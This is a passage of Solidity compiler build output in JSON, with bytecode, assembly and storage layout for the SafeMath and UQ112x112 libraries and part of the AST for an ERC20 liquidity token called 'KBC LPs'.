								"numberOfBytes": "20"
							},
							"t_bytes32": {
								"encoding": "inplace",
								"label": "bytes32",
								"numberOfBytes": "32"
							},
							"t_mapping(t_address,t_mapping(t_address,t_uint256))": {
								"encoding": "mapping",
								"key": "t_address",
								"label": "mapping(address => mapping(address => uint256))",
								"numberOfBytes": "32",
								"value": "t_mapping(t_address,t_uint256)"
							},
							"t_mapping(t_address,t_uint256)": {
								"encoding": "mapping",
								"key": "t_address",
								"label": "mapping(address => uint256)",
								"numberOfBytes": "32",
								"value": "t_uint256"
							},
							"t_uint112": {
								"encoding": "inplace",
								"label": "uint112",
								"numberOfBytes": "14"
							},
							"t_uint256": {
								"encoding": "inplace",
								"label": "uint256",
								"numberOfBytes": "32"
							},
							"t_uint32": {
								"encoding": "inplace",
								"label": "uint32",
								"numberOfBytes": "4"
							}
						}
					},
					"userdoc": {
						"methods": {}
					}
				}
			},
			"SafeMath.sol": {
				"SafeMath": {
					"abi": [],
					"devdoc": {
						"methods": {}
					},
					"evm": {
						"assembly": "    /* \"SafeMath.sol\":175:632  library SafeMath {... */\n  dataSize(sub_0)\n  dataOffset(sub_0)\n    /* \"--CODEGEN--\":132:134   */\n  0x0b\n    /* \"--CODEGEN--\":166:173   */\n  dup3\n    /* \"--CODEGEN--\":155:164   */\n  dup3\n    /* \"--CODEGEN--\":146:153   */\n  dup3\n    /* \"--CODEGEN--\":137:174   */\n  codecopy\n    /* \"--CODEGEN--\":255:262   */\n  dup1\n    /* \"--CODEGEN--\":249:263   */\n  mload\n    /* \"--CODEGEN--\":246:247   */\n  0x00\n    /* \"--CODEGEN--\":241:264   */\n  byte\n    /* \"--CODEGEN--\":235:239   */\n  0x73\n    /* \"--CODEGEN--\":232:265   */\n  eq\n    /* \"--CODEGEN--\":222:224   */\n  tag_1\n  jumpi\n    /* \"--CODEGEN--\":269:278   */\n  invalid\n    /* \"--CODEGEN--\":222:224   */\ntag_1:\n    /* \"--CODEGEN--\":293:302   */\n  address\n    /* \"--CODEGEN--\":290:291   */\n  0x00\n    /* \"--CODEGEN--\":283:303   */\n  mstore\n    /* \"--CODEGEN--\":323:327   */\n  0x73\n    /* \"--CODEGEN--\":314:321   */\n  dup2\n    /* \"--CODEGEN--\":306:328   */\n  mstore8\n    /* \"--CODEGEN--\":347:354   */\n  dup3\n    /* \"--CODEGEN--\":338:345   */\n  dup2\n    /* \"--CODEGEN--\":331:355   */\n  return\nstop\n\nsub_0: assembly {\n        /* \"SafeMath.sol\":175:632  library SafeMath {... */\n      eq(address, deployTimeAddress())\n      mstore(0x40, 0x80)\n      0x00\n      dup1\n      revert\n\n    auxdata: 0xa265627a7a723158208b84565d861bcb8c18746d468265427c91babb5ca2caba6c6380401514d1fbfc64736f6c63430005100032\n}\n",
						"bytecode": {
							"linkReferences": {},
							"object": "60556023600b82828239805160001a607314601657fe5b30600052607381538281f3fe73000000000000000000000000000000000000000030146080604052600080fdfea265627a7a723158208b84565d861bcb8c18746d468265427c91babb5ca2caba6c6380401514d1fbfc64736f6c63430005100032",
							"opcodes": "PUSH1 0x55 PUSH1 0x23 PUSH1 0xB DUP3 DUP3 DUP3 CODECOPY DUP1 MLOAD PUSH1 0x0 BYTE PUSH1 0x73 EQ PUSH1 0x16 JUMPI INVALID JUMPDEST ADDRESS PUSH1 0x0 MSTORE PUSH1 0x73 DUP2 MSTORE8 DUP3 DUP2 RETURN INVALID PUSH20 0x0 ADDRESS EQ PUSH1 0x80 PUSH1 0x40 MSTORE PUSH1 0x0 DUP1 REVERT INVALID LOG2 PUSH6 0x627A7A723158 KECCAK256 DUP12 DUP5 JUMP 0x5D DUP7 SHL 0xCB DUP13 XOR PUSH21 0x6D468265427C91BABB5CA2CABA6C6380401514D1FB 0xFC PUSH5 0x736F6C6343 STOP SDIV LT STOP ORIGIN ",
							"sourceMap": "175:457:7:-;;132:2:-1;166:7;155:9;146:7;137:37;255:7;249:14;246:1;241:23;235:4;232:33;222:2;;269:9;222:2;293:9;290:1;283:20;323:4;314:7;306:22;347:7;338;331:24"
						},
						"deployedBytecode": {
							"linkReferences": {},
							"object": "73000000000000000000000000000000000000000030146080604052600080fdfea265627a7a723158208b84565d861bcb8c18746d468265427c91babb5ca2caba6c6380401514d1fbfc64736f6c63430005100032",
							"opcodes": "PUSH20 0x0 ADDRESS EQ PUSH1 0x80 PUSH1 0x40 MSTORE PUSH1 0x0 DUP1 REVERT INVALID LOG2 PUSH6 0x627A7A723158 KECCAK256 DUP12 DUP5 JUMP 0x5D DUP7 SHL 0xCB DUP13 XOR PUSH21 0x6D468265427C91BABB5CA2CABA6C6380401514D1FB 0xFC PUSH5 0x736F6C6343 STOP SDIV LT STOP ORIGIN ",
							"sourceMap": "175:457:7:-;;;;;;;;"
						},
						"gasEstimates": {
							"creation": {
								"codeDepositCost": "17000",
								"executionCost": "94",
								"totalCost": "17094"
							},
							"internal": {
								"add(uint256,uint256)": "infinite",
								"mul(uint256,uint256)": "infinite",
								"sub(uint256,uint256)": "infinite"
							}
						},
						"legacyAssembly": {
							".code": [
								{
									"begin": 175,
									"end": 632,
									"name": "PUSH #[$]",
									"value": "0000000000000000000000000000000000000000000000000000000000000000"
								},
								{
									"begin": 175,
									"end": 632,
									"name": "PUSH [$]",
									"value": "0000000000000000000000000000000000000000000000000000000000000000"
								},
								{
									"begin": 132,
									"end": 134,
									"name": "PUSH",
									"value": "B"
								},
								{
									"begin": 166,
									"end": 173,
									"name": "DUP3"
								},
								{
									"begin": 155,
									"end": 164,
									"name": "DUP3"
								},
								{
									"begin": 146,
									"end": 153,
									"name": "DUP3"
								},
								{
									"begin": 137,
									"end": 174,
									"name": "CODECOPY"
								},
								{
									"begin": 255,
									"end": 262,
									"name": "DUP1"
								},
								{
									"begin": 249,
									"end": 263,
									"name": "MLOAD"
								},
								{
									"begin": 246,
									"end": 247,
									"name": "PUSH",
									"value": "0"
								},
								{
									"begin": 241,
									"end": 264,
									"name": "BYTE"
								},
								{
									"begin": 235,
									"end": 239,
									"name": "PUSH",
									"value": "73"
								},
								{
									"begin": 232,
									"end": 265,
									"name": "EQ"
								},
								{
									"begin": 222,
									"end": 224,
									"name": "PUSH [tag]",
									"value": "1"
								},
								{
									"begin": 222,
									"end": 224,
									"name": "JUMPI"
								},
								{
									"begin": 269,
									"end": 278,
									"name": "INVALID"
								},
								{
									"begin": 222,
									"end": 224,
									"name": "tag",
									"value": "1"
								},
								{
									"begin": 222,
									"end": 224,
									"name": "JUMPDEST"
								},
								{
									"begin": 293,
									"end": 302,
									"name": "ADDRESS"
								},
								{
									"begin": 290,
									"end": 291,
									"name": "PUSH",
									"value": "0"
								},
								{
									"begin": 283,
									"end": 303,
									"name": "MSTORE"
								},
								{
									"begin": 323,
									"end": 327,
									"name": "PUSH",
									"value": "73"
								},
								{
									"begin": 314,
									"end": 321,
									"name": "DUP2"
								},
								{
									"begin": 306,
									"end": 328,
									"name": "MSTORE8"
								},
								{
									"begin": 347,
									"end": 354,
									"name": "DUP3"
								},
								{
									"begin": 338,
									"end": 345,
									"name": "DUP2"
								},
								{
									"begin": 331,
									"end": 355,
									"name": "RETURN"
								}
							],
							".data": {
								"0": {
									".auxdata": "a265627a7a723158208b84565d861bcb8c18746d468265427c91babb5ca2caba6c6380401514d1fbfc64736f6c63430005100032",
									".code": [
										{
											"begin": 175,
											"end": 632,
											"name": "PUSHDEPLOYADDRESS"
										},
										{
											"begin": 175,
											"end": 632,
											"name": "ADDRESS"
										},
										{
											"begin": 175,
											"end": 632,
											"name": "EQ"
										},
										{
											"begin": 175,
											"end": 632,
											"name": "PUSH",
											"value": "80"
										},
										{
											"begin": 175,
											"end": 632,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 175,
											"end": 632,
											"name": "MSTORE"
										},
										{
											"begin": 175,
											"end": 632,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 175,
											"end": 632,
											"name": "DUP1"
										},
										{
											"begin": 175,
											"end": 632,
											"name": "REVERT"
										}
									]
								}
							}
						},
						"methodIdentifiers": {}
					},
					"metadata": "{\"compiler\":{\"version\":\"0.5.16+commit.9c3226ce\"},\"language\":\"Solidity\",\"output\":{\"abi\":[],\"devdoc\":{\"methods\":{}},\"userdoc\":{\"methods\":{}}},\"settings\":{\"compilationTarget\":{\"SafeMath.sol\":\"SafeMath\"},\"evmVersion\":\"istanbul\",\"libraries\":{},\"optimizer\":{\"enabled\":true,\"runs\":200},\"remappings\":[]},\"sources\":{\"SafeMath.sol\":{\"keccak256\":\"0xd0cc5ede4252f34f9adf75af689fb003aa6349f229b9bba72db43cba9bb1c9d9\",\"urls\":[\"bzz-raw://a2cb594533aebe5028b93c5c429b23907a4830964d8c6728565992bee4cf1eef\",\"dweb:/ipfs/QmdSBCeJiqjQeGZ2K79DXaDfaqJMtXCWAyXDWJ3KNDWZKM\"]}},\"version\":1}",
					"storageLayout": {
						"storage": [],
						"types": null
					},
					"userdoc": {
						"methods": {}
					}
				}
			},
			"UQ112x112.sol": {
				"UQ112x112": {
					"abi": [],
					"devdoc": {
						"methods": {}
					},
					"evm": {
						"assembly": "    /* \"UQ112x112.sol\":219:615  library UQ112x112 {... */\n  dataSize(sub_0)\n  dataOffset(sub_0)\n    /* \"--CODEGEN--\":132:134   */\n  0x0b\n    /* \"--CODEGEN--\":166:173   */\n  dup3\n    /* \"--CODEGEN--\":155:164   */\n  dup3\n    /* \"--CODEGEN--\":146:153   */\n  dup3\n    /* \"--CODEGEN--\":137:174   */\n  codecopy\n    /* \"--CODEGEN--\":255:262   */\n  dup1\n    /* \"--CODEGEN--\":249:263   */\n  mload\n    /* \"--CODEGEN--\":246:247   */\n  0x00\n    /* \"--CODEGEN--\":241:264   */\n  byte\n    /* \"--CODEGEN--\":235:239   */\n  0x73\n    /* \"--CODEGEN--\":232:265   */\n  eq\n    /* \"--CODEGEN--\":222:224   */\n  tag_1\n  jumpi\n    /* \"--CODEGEN--\":269:278   */\n  invalid\n    /* \"--CODEGEN--\":222:224   */\ntag_1:\n    /* \"--CODEGEN--\":293:302   */\n  address\n    /* \"--CODEGEN--\":290:291   */\n  0x00\n    /* \"--CODEGEN--\":283:303   */\n  mstore\n    /* \"--CODEGEN--\":323:327   */\n  0x73\n    /* \"--CODEGEN--\":314:321   */\n  dup2\n    /* \"--CODEGEN--\":306:328   */\n  mstore8\n    /* \"--CODEGEN--\":347:354   */\n  dup3\n    /* \"--CODEGEN--\":338:345   */\n  dup2\n    /* \"--CODEGEN--\":331:355   */\n  return\nstop\n\nsub_0: assembly {\n        /* \"UQ112x112.sol\":219:615  library UQ112x112 {... */\n      eq(address, deployTimeAddress())\n      mstore(0x40, 0x80)\n      0x00\n      dup1\n      revert\n\n    auxdata: 0xa265627a7a723158208a34613340da9642054e1f24826a5ac0bcdc012f21706d3d3cf6f0e9ee79477a64736f6c63430005100032\n}\n",
						"bytecode": {
							"linkReferences": {},
							"object": "60556023600b82828239805160001a607314601657fe5b30600052607381538281f3fe73000000000000000000000000000000000000000030146080604052600080fdfea265627a7a723158208a34613340da9642054e1f24826a5ac0bcdc012f21706d3d3cf6f0e9ee79477a64736f6c63430005100032",
							"opcodes": "PUSH1 0x55 PUSH1 0x23 PUSH1 0xB DUP3 DUP3 DUP3 CODECOPY DUP1 MLOAD PUSH1 0x0 BYTE PUSH1 0x73 EQ PUSH1 0x16 JUMPI INVALID JUMPDEST ADDRESS PUSH1 0x0 MSTORE PUSH1 0x73 DUP2 MSTORE8 DUP3 DUP2 RETURN INVALID PUSH20 0x0 ADDRESS EQ PUSH1 0x80 PUSH1 0x40 MSTORE PUSH1 0x0 DUP1 REVERT INVALID LOG2 PUSH6 0x627A7A723158 KECCAK256 DUP11 CALLVALUE PUSH2 0x3340 0xDA SWAP7 TIMESTAMP SDIV 0x4E 0x1F 0x24 DUP3 PUSH11 0x5AC0BCDC012F21706D3D3C 0xF6 CREATE 0xE9 0xEE PUSH26 0x477A64736F6C6343000510003200000000000000000000000000 ",
							"sourceMap": "219:396:8:-;;132:2:-1;166:7;155:9;146:7;137:37;255:7;249:14;246:1;241:23;235:4;232:33;222:2;;269:9;222:2;293:9;290:1;283:20;323:4;314:7;306:22;347:7;338;331:24"
						},
						"deployedBytecode": {
							"linkReferences": {},
							"object": "73000000000000000000000000000000000000000030146080604052600080fdfea265627a7a723158208a34613340da9642054e1f24826a5ac0bcdc012f21706d3d3cf6f0e9ee79477a64736f6c63430005100032",
							"opcodes": "PUSH20 0x0 ADDRESS EQ PUSH1 0x80 PUSH1 0x40 MSTORE PUSH1 0x0 DUP1 REVERT INVALID LOG2 PUSH6 0x627A7A723158 KECCAK256 DUP11 CALLVALUE PUSH2 0x3340 0xDA SWAP7 TIMESTAMP SDIV 0x4E 0x1F 0x24 DUP3 PUSH11 0x5AC0BCDC012F21706D3D3C 0xF6 CREATE 0xE9 0xEE PUSH26 0x477A64736F6C6343000510003200000000000000000000000000 ",
							"sourceMap": "219:396:8:-;;;;;;;;"
						},
						"gasEstimates": {
							"creation": {
								"codeDepositCost": "17000",
								"executionCost": "94",
								"totalCost": "17094"
							},
							"internal": {
								"encode(uint112)": "infinite",
								"uqdiv(uint224,uint112)": "infinite"
							}
						},
						"legacyAssembly": {
							".code": [
								{
									"begin": 219,
									"end": 615,
									"name": "PUSH #[$]",
									"value": "0000000000000000000000000000000000000000000000000000000000000000"
								},
								{
									"begin": 219,
									"end": 615,
									"name": "PUSH [$]",
									"value": "0000000000000000000000000000000000000000000000000000000000000000"
								},
								{
									"begin": 132,
									"end": 134,
									"name": "PUSH",
									"value": "B"
								},
								{
									"begin": 166,
									"end": 173,
									"name": "DUP3"
								},
								{
									"begin": 155,
									"end": 164,
									"name": "DUP3"
								},
								{
									"begin": 146,
									"end": 153,
									"name": "DUP3"
								},
								{
									"begin": 137,
									"end": 174,
									"name": "CODECOPY"
								},
								{
									"begin": 255,
									"end": 262,
									"name": "DUP1"
								},
								{
									"begin": 249,
									"end": 263,
									"name": "MLOAD"
								},
								{
									"begin": 246,
									"end": 247,
									"name": "PUSH",
									"value": "0"
								},
								{
									"begin": 241,
									"end": 264,
									"name": "BYTE"
								},
								{
									"begin": 235,
									"end": 239,
									"name": "PUSH",
									"value": "73"
								},
								{
									"begin": 232,
									"end": 265,
									"name": "EQ"
								},
								{
									"begin": 222,
									"end": 224,
									"name": "PUSH [tag]",
									"value": "1"
								},
								{
									"begin": 222,
									"end": 224,
									"name": "JUMPI"
								},
								{
									"begin": 269,
									"end": 278,
									"name": "INVALID"
								},
								{
									"begin": 222,
									"end": 224,
									"name": "tag",
									"value": "1"
								},
								{
									"begin": 222,
									"end": 224,
									"name": "JUMPDEST"
								},
								{
									"begin": 293,
									"end": 302,
									"name": "ADDRESS"
								},
								{
									"begin": 290,
									"end": 291,
									"name": "PUSH",
									"value": "0"
								},
								{
									"begin": 283,
									"end": 303,
									"name": "MSTORE"
								},
								{
									"begin": 323,
									"end": 327,
									"name": "PUSH",
									"value": "73"
								},
								{
									"begin": 314,
									"end": 321,
									"name": "DUP2"
								},
								{
									"begin": 306,
									"end": 328,
									"name": "MSTORE8"
								},
								{
									"begin": 347,
									"end": 354,
									"name": "DUP3"
								},
								{
									"begin": 338,
									"end": 345,
									"name": "DUP2"
								},
								{
									"begin": 331,
									"end": 355,
									"name": "RETURN"
								}
							],
							".data": {
								"0": {
									".auxdata": "a265627a7a723158208a34613340da9642054e1f24826a5ac0bcdc012f21706d3d3cf6f0e9ee79477a64736f6c63430005100032",
									".code": [
										{
											"begin": 219,
											"end": 615,
											"name": "PUSHDEPLOYADDRESS"
										},
										{
											"begin": 219,
											"end": 615,
											"name": "ADDRESS"
										},
										{
											"begin": 219,
											"end": 615,
											"name": "EQ"
										},
										{
											"begin": 219,
											"end": 615,
											"name": "PUSH",
											"value": "80"
										},
										{
											"begin": 219,
											"end": 615,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 219,
											"end": 615,
											"name": "MSTORE"
										},
										{
											"begin": 219,
											"end": 615,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 219,
											"end": 615,
											"name": "DUP1"
										},
										{
											"begin": 219,
											"end": 615,
											"name": "REVERT"
										}
									]
								}
							}
						},
						"methodIdentifiers": {}
					},
					"metadata": "{\"compiler\":{\"version\":\"0.5.16+commit.9c3226ce\"},\"language\":\"Solidity\",\"output\":{\"abi\":[],\"devdoc\":{\"methods\":{}},\"userdoc\":{\"methods\":{}}},\"settings\":{\"compilationTarget\":{\"UQ112x112.sol\":\"UQ112x112\"},\"evmVersion\":\"istanbul\",\"libraries\":{},\"optimizer\":{\"enabled\":true,\"runs\":200},\"remappings\":[]},\"sources\":{\"UQ112x112.sol\":{\"keccak256\":\"0x6e2290410379a33e837cbc6ff96ff5d983345daf2d824705b6f4b4c22ebc36a9\",\"urls\":[\"bzz-raw://d3dc93ec9e4b2d9da2f664930040f7b88c6364d40289ddfa911a4403ea05e783\",\"dweb:/ipfs/QmXcS8kvWMEBQbdu9JodRhY1yjomGG13KZpcAivd5x2NDH\"]}},\"version\":1}",
					"storageLayout": {
						"storage": [],
						"types": null
					},
					"userdoc": {
						"methods": {}
					}
				}
			}
		},
		"sources": {
			"ERC20.sol": {
				"ast": {
					"absolutePath": "ERC20.sol",
					"exportedSymbols": {
						"ERC20": [
							435
						]
					},
					"id": 436,
					"nodeType": "SourceUnit",
					"nodes": [
						{
							"id": 1,
							"literals": [
								"solidity",
								"=",
								"0.5",
								".16"
							],
							"nodeType": "PragmaDirective",
							"src": "36:24:0"
						},
						{
							"absolutePath": "IERC20.sol",
							"file": "./IERC20.sol",
							"id": 2,
							"nodeType": "ImportDirective",
							"scope": 436,
							"sourceUnit": 534,
							"src": "62:22:0",
							"symbolAliases": [],
							"unitAlias": ""
						},
						{
							"absolutePath": "SafeMath.sol",
							"file": "./SafeMath.sol",
							"id": 3,
							"nodeType": "ImportDirective",
							"scope": 436,
							"sourceUnit": 2300,
							"src": "85:24:0",
							"symbolAliases": [],
							"unitAlias": ""
						},
						{
							"baseContracts": [
								{
									"arguments": null,
									"baseName": {
										"contractScope": null,
										"id": 4,
										"name": "IERC20",
										"nodeType": "UserDefinedTypeName",
										"referencedDeclaration": 533,
										"src": "129:6:0",
										"typeDescriptions": {
											"typeIdentifier": "t_contract$_IERC20_$533",
											"typeString": "contract IERC20"
										}
									},
									"id": 5,
									"nodeType": "InheritanceSpecifier",
									"src": "129:6:0"
								}
							],
							"contractDependencies": [
								533
							],
							"contractKind": "contract",
							"documentation": null,
							"fullyImplemented": true,
							"id": 435,
							"linearizedBaseContracts": [
								435,
								533
							],
							"name": "ERC20",
							"nodeType": "ContractDefinition",
							"nodes": [
								{
									"id": 8,
									"libraryName": {
										"contractScope": null,
										"id": 6,
										"name": "SafeMath",
										"nodeType": "UserDefinedTypeName",
										"referencedDeclaration": 2299,
										"src": "148:8:0",
										"typeDescriptions": {
											"typeIdentifier": "t_contract$_SafeMath_$2299",
											"typeString": "library SafeMath"
										}
									},
									"nodeType": "UsingForDirective",
									"src": "142:27:0",
									"typeName": {
										"id": 7,
										"name": "uint256",
										"nodeType": "ElementaryTypeName",
										"src": "161:7:0",
										"typeDescriptions": {
											"typeIdentifier": "t_uint256",
											"typeString": "uint256"
										}
									}
								},
								{
									"constant": true,
									"id": 11,
									"name": "name",
									"nodeType": "VariableDeclaration",
									"scope": 435,
									"src": "175:39:0",
									"stateVariable": true,
									"storageLocation": "default",
									"typeDescriptions": {
										"typeIdentifier": "t_string_memory",
										"typeString": "string"
									},
									"typeName": {
										"id": 9,
										"name": "string",
										"nodeType": "ElementaryTypeName",
										"src": "175:6:0",
										"typeDescriptions": {
											"typeIdentifier": "t_string_storage_ptr",
											"typeString": "string"
										}
									},
									"value": {
										"argumentTypes": null,
										"hexValue": "4b4243204c5073",
										"id": 10,
										"isConstant": false,
										"isLValue": false,
										"isPure": true,
										"kind": "string",
										"lValueRequested": false,
										"nodeType": "Literal",
										"src": "205:9:0",
										"subdenomination": null,
										"typeDescriptions": {
											"typeIdentifier": "t_stringliteral_6a36d39f32c2225411d16c8f56813b9117e6eb8bf3d2893c5fc62411565cfcfe",
											"typeString": "literal_string \"KBC LPs\""
										},
										"value": "KBC LPs"
									},
									"visibility": "public"
								},
								{
									"constant": true,
									"id": 14,
									"name": "symbol",
									"nodeType": "VariableDeclaration",
									"scope": 435,
									"src": "220:40:0",
									"stateVariable": true,
									"storageLocation": "default",
									"typeDescriptions": {
										"typeIdentifier": "t_string_memory",
										"typeString": "string"
									},
									"typeName": {
										"id": 12,
										"name": "string",
										"nodeType": "ElementaryTypeName",
										"src": "220:6:0",
										"typeDescriptions": {
											"typeIdentifier": "t_string_storage_ptr",
											"typeString": "string"
										}
									},
									"value": {
										"argumentTypes": null,
										"hexValue": "4b42432d4c50",
										"id": 13,
										"isConstant": false,
										"isLValue": false,
										"isPure": true,
										"kind": "string",
										"lValueRequested": false,
										"nodeType": "Literal",
										"src": "252:8:0",
										"subdenomination": null,
										"typeDescriptions": {
											"typeIdentifier": "t_stringliteral_9878e19940d7064c845a25b9c0bf389acf4056353ef4909809f58f429b7f50da",
											"typeString": "literal_string \"KBC-LP\""
										},
										"value": "KBC-LP"
									},
									"visibility": "public"
								},
								{
									"constant": true,
									"id": 17,
									"name": "decimals",
									"nodeType": "VariableDeclaration",
									"scope": 435,
									"src": "266:35:0",
									"stateVariable": true,
									"storageLocation": "default",
									"typeDescriptions": {
										"typeIdentifier": "t_uint8",
										"typeString": "uint8"
									},
									"typeName": {
										"id": 15,
										"name": "uint8",
										"nodeType": "ElementaryTypeName",
										"src": "266:5:0",
										"typeDescriptions": {
											"typeIdentifier": "t_uint8",
											"typeString": "uint8"
										}
									},
									"value": {
										"argumentTypes": null,
										"hexValue": "3138",
										"id": 16,
										"isConstant": false,
										"isLValue": false,
										"isPure": true,
										"kind": "number",
										"lValueRequested": false,
										"nodeType": "Literal",
										"src": "299:2:0",
										"subdenomination": null,
										"typeDescriptions": {
											"typeIdentifier": "t_rational_18_by_1",
											"typeString": "int_const 18"
										},
										"value": "18"
									},
									"visibility": "public"
								},
								{
									"constant": false,
									"id": 19,
									"name": "totalSupply",
									"nodeType": "VariableDeclaration",
									"scope": 435,
									"src": "307:26:0",
									"stateVariable": true,
									"storageLocation": "default",
									"typeDescriptions": {
										"typeIdentifier": "t_uint256",
										"typeString": "uint256"
									},
									"typeName": {
										"id": 18,
										"name": "uint256",
										"nodeType": "ElementaryTypeName",
										"src": "307:7:0",
										"typeDescriptions": {
											"typeIdentifier": "t_uint256",
											"typeString": "uint256"
										}
									},
									"value": null,
									"visibility": "public"
								},
								{
									"constant": false,
									"id": 23,
									"name": "balanceOf",
									"nodeType": "VariableDeclaration",
									"scope": 435,
									"src": "339:44:0",
									"stateVariable": true,
									"storageLocation": "default",
									"typeDescriptions": {
										"typeIdentifier": "t_mapping$_t_address_$_t_uint256_$",
										"typeString": "mapping(address => uint256)"
									},
									"typeName": {
										"id": 22,
										"keyType": {
											"id": 20,
											"name": "address",
											"nodeType": "ElementaryTypeName",
											"src": "347:7:0",
											"typeDescriptions": {
												"typeIdentifier": "t_address",
												"typeString": "address"
											}
										},
										"nodeType": "Mapping",
										"src": "339:27:0",
										"typeDescriptions": {
											"typeIdentifier": "t_mapping$_t_address_$_t_uint256_$",
											"typeString": "mapping(address => uint256)"
										},
										"valueType": {
											"id": 21,
											"name": "uint256",
											"nodeType": "ElementaryTypeName",
											"src": "358:7:0",
											"typeDescriptions": {
												"typeIdentifier": "t_uint256",
												"typeString": "uint256"
											}
										}
									},
									"value": null,
									"visibility": "public"
								},
								{
									"constant": false,
									"id": 29,
									"name": "allowance",
									"nodeType": "VariableDeclaration",
									"scope": 435,
									"src": "389:64:0",
									"stateVariable": true,
									"storageLocation": "default",
									"typeDescriptions": {
										"typeIdentifier": "t_mapping$_t_address_$_t_mapping$_t_address_$_t_uint256_$_$",
										"typeString": "mapping(address => mapping(address => uint256))"
									},
									"typeName": {
										"id": 28,
										"keyType": {
											"id": 24,
											"name": "address",
											"nodeType": "ElementaryTypeName",
											"src": "397:7:0",
											"typeDescriptions": {
												"typeIdentifier": "t_address",
												"typeString": "address"
											}
										},
										"nodeType": "Mapping",
										"src": "389:47:0",
										"typeDescriptions": {
											"typeIdentifier": "t_mapping$_t_address_$_t_mapping$_t_address_$_t_uint256_$_$",
											"typeString": "mapping(address => mapping(address => uint256))"
										},
										"valueType": {
											"id": 27,
											"keyType": {
												"id": 25,
												"name": "address",
												"nodeType": "ElementaryTypeName",
												"src": "416:7:0",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												}
											},
											"nodeType": "Mapping",
											"src": "408:27:0",
											"typeDescriptions": {
												"typeIdentifier": "t_mapping$_t_address_$_t_uint256_$",
												"typeString": "mapping(address => uint256)"
											},
											"valueType": {
												"id": 26,
												"name": "uint256",
												"nodeType": "ElementaryTypeName",
												"src": "427:7:0",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												}
											}
										}
									},
									"value": null,
									"visibility": "public"
								},
								{
									"constant": false,
									"id": 33,
									"name": "_frozenBalance",
									"nodeType": "VariableDeclaration",
									"scope": 435,
									"src": "459:49:0",
									"stateVariable": true,
									"storageLocation": "default",
									"typeDescriptions": {
										"typeIdentifier": "t_mapping$_t_address_$_t_uint256_$",
										"typeString": "mapping(address => uint256)"
									},
									"typeName": {
										"id": 32,
										"keyType": {
											"id": 30,
											"name": "address",
											"nodeType": "ElementaryTypeName",
											"src": "467:7:0",
											"typeDescriptions": {
												"typeIdentifier": "t_address",
												"typeString": "address"
											}
										},
										"nodeType": "Mapping",
										"src": "459:27:0",
										"typeDescriptions": {
											"typeIdentifier": "t_mapping$_t_address_$_t_uint256_$",
											"typeString": "mapping(address => uint256)"
										},
										"valueType": {
											"id": 31,
											"name": "uint256",
											"nodeType": "ElementaryTypeName",
											"src": "478:7:0",
											"typeDescriptions": {
												"typeIdentifier": "t_uint256",
												"typeString": "uint256"
											}
										}
									},
									"value": null,
									"visibility": "public"
								},
								{
									"constant": false,
									"id": 35,
									"name": "DOMAIN_SEPARATOR",
									"nodeType": "VariableDeclaration",
									"scope": 435,
									"src": "515:31:0",
									"stateVariable": true,
									"storageLocation": "default",
									"typeDescriptions": {
										"typeIdentifier": "t_bytes32",
										"typeString": "bytes32"
									},
									"typeName": {
										"id": 34,
										"name": "bytes32",
										"nodeType": "ElementaryTypeName",
										"src": "515:7:0",
										"typeDescriptions": {
											"typeIdentifier": "t_bytes32",
											"typeString": "bytes32"
										}
									},
									"value": null,
									"visibility": "public"
								},
								{
									"constant": true,
									"id": 38,
									"name": "PERMIT_TYPEHASH",
									"nodeType": "VariableDeclaration",
									"scope": 435,
									"src": "656:116:0",
									"stateVariable": true,
									"storageLocation": "default",
									"typeDescriptions": {
										"typeIdentifier": "t_bytes32",
										"typeString": "bytes32"
									},
									"typeName": {
										"id": 36,
										"name": "bytes32",
										"nodeType": "ElementaryTypeName",
										"src": "656:7:0",
										"typeDescriptions": {
											"typeIdentifier": "t_bytes32",
											"typeString": "bytes32"
										}
									},
									"value": {
										"argumentTypes": null,
										"hexValue": "307836653731656461653132623162393766346431663630333730666566313031303566613266616165303132363131346131363963363438343564363132366339",
										"id": 37,
										"isConstant": false,
										"isLValue": false,
										"isPure": true,
										"kind": "number",
										"lValueRequested": false,
										"nodeType": "Literal",
										"src": "706:66:0",
										"subdenomination": null,
										"typeDescriptions": {
											"typeIdentifier": "t_rational_49955707469362902507454157297736832118868343942642399513960811609542965143241_by_1",
											"typeString": "int_const 4995...(69 digits omitted)...3241"
										},
										"value": "0x6e71edae12b1b97f4d1f60370fef10105fa2faae0126114a169c64845d6126c9"
									},
									"visibility": "public"
								},
								{
									"constant": false,
									"id": 42,
									"name": "nonces",
									"nodeType": "VariableDeclaration",
									"scope": 435,
									"src": "778:41:0",
									"stateVariable": true,
									"storageLocation": "default",
									"typeDescriptions": {
										"typeIdentifier": "t_mapping$_t_address_$_t_uint256_$",
										"typeString": "mapping(address => uint256)"
									},
									"typeName": {
										"id": 41,
										"keyType": {
											"id": 39,
											"name": "address",
											"nodeType": "ElementaryTypeName",
											"src": "786:7:0",
											"typeDescriptions": {
												"typeIdentifier": "t_address",
												"typeString": "address"
											}
										},
										"nodeType": "Mapping",
										"src": "778:27:0",
										"typeDescriptions": {
											"typeIdentifier": "t_mapping$_t_address_$_t_uint256_$",
											"typeString": "mapping(address => uint256)"
										},
										"valueType": {
											"id": 40,
											"name": "uint256",
											"nodeType": "ElementaryTypeName",
											"src": "797:7:0",
											"typeDescriptions": {
												"typeIdentifier": "t_uint256",
												"typeString": "uint256"
											}
										}
									},
									"value": null,
									"visibility": "public"
								},
								{
									"anonymous": false,
									"documentation": null,
									"id": 50,
									"name": "Approval",
									"nodeType": "EventDefinition",
									"parameters": {
										"id": 49,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 44,
												"indexed": true,
												"name": "owner",
												"nodeType": "VariableDeclaration",
												"scope": 50,
												"src": "850:21:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 43,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "850:7:0",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 46,
												"indexed": true,
												"name": "spender",
												"nodeType": "VariableDeclaration",
												"scope": 50,
												"src": "881:23:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
